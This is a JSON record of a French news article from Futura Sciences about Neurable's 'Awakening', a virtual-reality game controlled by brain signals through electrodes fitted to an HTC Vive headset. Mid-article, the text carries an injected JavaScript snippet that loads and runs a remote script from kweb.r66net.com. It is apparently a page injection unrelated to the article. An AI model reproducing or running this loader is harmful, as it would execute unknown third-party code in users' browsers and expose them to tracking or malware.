{"title": "Réalité virtuelle : le premier jeu contrôlé par le cerveau", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "09/08/2017", "content": "Neurable, une jeune pousse nord-américaine, vient de présenter le tout premier jeu vidéo en réalité virtuelle contrôlé uniquement à l'aide d'une interface neuronale directe et d'un casque HTC Vive spécialement adapté. Ce qu'il faut retenir Les interfaces de contrôle pour les applications de réalité virtuelle et augmentée sont encore balbutiantes. Neurable a créé le premier jeu vidéo de réalité virtuelle qui se commande par l’activité cérébrale et d'une manière plus subtile que celle des casques EEG déjà connus. L’objectif est de créer une interface qui soit à la réalité virtuelle ce que la souris est à l’ordinateur. Dans le domaine des nouvelles technologies, la création d'interfaces adaptées a accompagné les principales révolutions, que ce soit l'interface graphique et la souris pour l' ordinateur  ou l' écran tactile  pour les  smartphones . Annoncées comme les outils de demain, la  réalité virtuelle  et la  réalité augmentée  n'ont pas encore trouvé ce graal qui les rendra accessibles à un large public. Si les  casques de réalité virtuelle  et augmentée type HTC Vive,  Oculus Rift , Gear VR ou  HoloLens  contribuent à populariser ces technologies, les  interfaces de contrôle  pour se déplacer dans ces  univers , manipuler les objets et accomplir des actions sont encore balbutiantes. La plupart des solutions reposent sur l'utilisation de manettes, de gants ou de  costumes à retour haptique  qui permettent de sentir un objet virtuel voire d'éprouver des effets  physiques  comme un coup de poing. Des équipements qui viennent s'ajouter au casque déjà encombrant et demandent une mise en œuvre peu commode. Et si notre  cerveau  était l'interface idéale pour naviguer dans les univers virtuels ? C'est le pari que fait  Neurable . Cette jeune entreprise innovante a présenté lors de la conférence Siggraph le tout premier jeu vidéo en  réalité virtuelle  contrôlé par l'activité cérébrale via une interface neuronale directe. Intitulé Awakening, il a été codéveloppé avec l'éditeur espagnol eStudiofuture et s'utilise avec un casque HTC Vive muni d' électrodes . Le jeu s'inspire de la série  Stranger Things  : un enfant doté de pouvoirs télékinésiques prisonnier d'un laboratoire doit s'échapper en manipulant des objets, en déviant des tirs de  laser  et en combattant des  robots , le tout sans manette de jeu. Cette vidéo de démonstration tournée par le site UploadVR lors de la conférence Siggraph montre la phase de calibrage de l’interface neuronale directe qui permet de contrôler objets virtuels à la seule aide de l’activité cérébrale associée à la pensée d’une action. © UploadVR  Neurable veut créer une « souris cérébrale »  Le joueur déclenche une action en focalisant son attention sur un objet. Dans un entretien avec le site  IEEE Spectrum , Ramses Alcaide, le PDG de Neurable, a expliqué comment fonctionne sa technologie. Contrairement aux autres systèmes  EEG  (l'électroencéphalographie), l'interface neuronale ne détecte pas les ondes cérébrales associées à un  état de concentration  ou de relaxation mais s'appuie sur ce l'on appelle le potentiel évoqué. Il s'agit d'un signal plus précis qui se produit lorsque le cerveau répond à une  stimulation , par exemple une image ou un son.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le cœur de la technologie se situe au niveau de l' interface neuronale  et de l'algorithme d'apprentissage profond qui interprète ces informations. Plongé dans l'univers virtuel d'Awakening, le joueur voit des objets animés. Dès qu'il focalise son  regard  sur l'un d'eux et pense à une action, par exemple « prendre », l'interaction s'accomplit. Pour capter ce signal, il faut que les électrodes soient disposées sur des zones spécifiques.  Neurable a remplacé le serre-tête d'un casque Vive par un dispositif qui maintient sept électrodes, principalement au niveau de la partie arrière du  crâne . La  start-up  précise que le dispositif peut très bien être adapté pour d'autres modèles comme l'Oculus Rift ou les lunettes HoloLens de Microsoft. Neurable a l'intention de commercialiser Awakening dans le courant de l'année prochaine auprès des salles de jeux vidéo. Elle propose également un kit de développement (SDK) compatible avec le moteur de jeu Unity afin que les créateurs puissent intégrer le contrôle par  interface neuronale  dans leurs titres. À terme, l'entreprise espère faire de sa solution une  interface utilisateur  généraliste qui soit la « souris cérébrale » de la réalité virtuelle. Réalité virtuelle : vers l'immersion totale avec Orion de Leap Motion                       La société américaine Leap Motion propose en version bêta Orion. Cette application, utilisée avec un capteur et un casque de réalité virtuelle, permet de contrôler des objets avec une grande précision directement avec les mains, comme on peut le constater durant cette démonstration.                                       ", "theme": "tech"}